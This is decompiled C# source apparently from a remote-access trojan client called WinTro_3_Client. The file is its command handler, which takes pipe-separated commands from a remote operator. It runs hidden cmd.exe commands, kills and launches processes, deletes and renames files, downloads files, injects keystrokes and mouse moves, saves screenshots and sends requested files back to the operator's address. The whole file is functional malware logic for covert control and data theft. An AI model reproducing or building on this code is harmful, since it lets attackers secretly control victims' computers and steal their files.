using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace WinTro_3_Client;

internal class ComandiRicevuti
{
	public Client Client;

	private LongCommands LongCommand;

	public ComandiRicevuti(Client client)
	{
		LongCommand = new LongCommands(client);
		Client = client;
	}

	public void InterpretaComando(string text)
	{
		string[] array = text.Split(new char[1] { '|' });
		switch (array[0])
		{
		case "client":
			ClientCommand(array);
			break;
		case "messagebox":
			MessageBoxCommand(array);
			break;
		case "process":
			ProcessCommand(array);
			break;
		case "files":
			FileCommand(array);
			break;
		case "internet":
			InternetCommand(array);
			break;
		case "mouseandkeyboard":
			MouseAndKeyboardCommand(array);
			break;
		case "filetransfer":
			FileTransferCommand(array);
			break;
		case "windows":
			WindowsCommand(array);
			break;
		}
	}

	private void ClientCommand(string[] comando)
	{
		switch (comando[1])
		{
		case "restart":
			Application.Restart();
			break;
		case "exit":
			Client.Data.Send("Exiting client...");
			Client.Disconnect(connectAgain: false);
			Application.Exit();
			Environment.Exit(0);
			break;
		case "disconnect":
			Client.Disconnect(connectAgain: true);
			break;
		}
	}

	private void MessageBoxCommand(string[] comando)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		switch (comando[1])
		{
		case "error":
			MessageBox.Show(comando[3], comando[2], (MessageBoxButtons)0, (MessageBoxIcon)16);
			break;
		case "warn":
			MessageBox.Show(comando[3], comando[2], (MessageBoxButtons)0, (MessageBoxIcon)48);
			break;
		case "info":
			MessageBox.Show(comando[3], comando[2], (MessageBoxButtons)0, (MessageBoxIcon)64);
			break;
		}
	}

	private void ProcessCommand(string[] comando)
	{
		switch (comando[1])
		{
		case "getlist":
			Client.Data.Send("viewtext|" + LongCommands.GetProcessesList());
			break;
		case "hidden_cmd":
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/k " + util.AttaccaParametri(comando, 2));
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			ProcessStartInfo startInfo2 = processStartInfo;
			Process.Start(startInfo2);
			break;
		}
		case "visible_cmd":
		{
			ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe", "/k " + util.AttaccaParametri(comando, 2));
			Process.Start(startInfo);
			break;
		}
		case "stop":
		{
			Process[] processesByName = Process.GetProcessesByName(comando[2]);
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			break;
		}
		case "start":
			Process.Start(util.AttaccaParametri(comando, 2));
			break;
		}
	}

	private void FileCommand(string[] comando)
	{
		switch (comando[1])
		{
		case "setwallpaper":
			LongCommand.SetDesktopWallpaper(util.AttaccaParametri(comando, 2));
			break;
		case "getinfo":
			Client.Data.Send("viewtext|" + LongCommands.GetFileInfo(comando[2]));
			break;
		case "viewlistat":
			Client.Data.Send(LongCommands.GetFileListAt(comando[2], showCompleteDrivesNames: false));
			break;
		case "delete":
			File.Delete(comando[2]);
			break;
		case "rename":
			File.Move(comando[2], comando[2].Remove(comando[2].LastIndexOf("\\") + 1, comando[2].Length - comando[2].LastIndexOf("\\") - 1) + comando[3]);
			break;
		}
	}

	private void InternetCommand(string[] comando)
	{
		string text = comando[1];
		if (text != null && text == "downloadfile")
		{
			LongCommand.DownloadFile(comando[2], comando[3]);
		}
	}

	private void MouseAndKeyboardCommand(string[] comando)
	{
		switch (comando[1])
		{
		case "setcurpos":
			Cursor.set_Position(new Point(int.Parse(comando[2]), int.Parse(comando[3])));
			break;
		case "sendkeys":
			SendKeys.Send(util.AttaccaParametri(comando, 2));
			break;
		}
	}

	private void FileTransferCommand(string[] comando)
	{
		switch (comando[1])
		{
		case "startsending":
			new FileTransfer(Client.IP, Client.FileTransferPort, FileTransfer.file, Client).Connect();
			break;
		case "requestfile":
		{
			FileTransfer.file = comando[2];
			StreamReader streamReader = new StreamReader(FileTransfer.file);
			long num = (FileTransfer.FileSize = streamReader.BaseStream.Length);
			streamReader.Close();
			Client.Data.Send("filetransfer|ready|" + num);
			break;
		}
		}
	}

	private void WindowsCommand(string[] comando)
	{
		string text = comando[1];
		if (text != null && text == "savescreenshot")
		{
			if (comando[2] == "png")
			{
				LongCommands.ScreenCapture.CaptureScreenToFile(comando[3], ImageFormat.get_Png());
			}
			else
			{
				LongCommands.ScreenCapture.CaptureScreenToFile(comando[3], ImageFormat.get_Jpeg());
			}
		}
	}
}
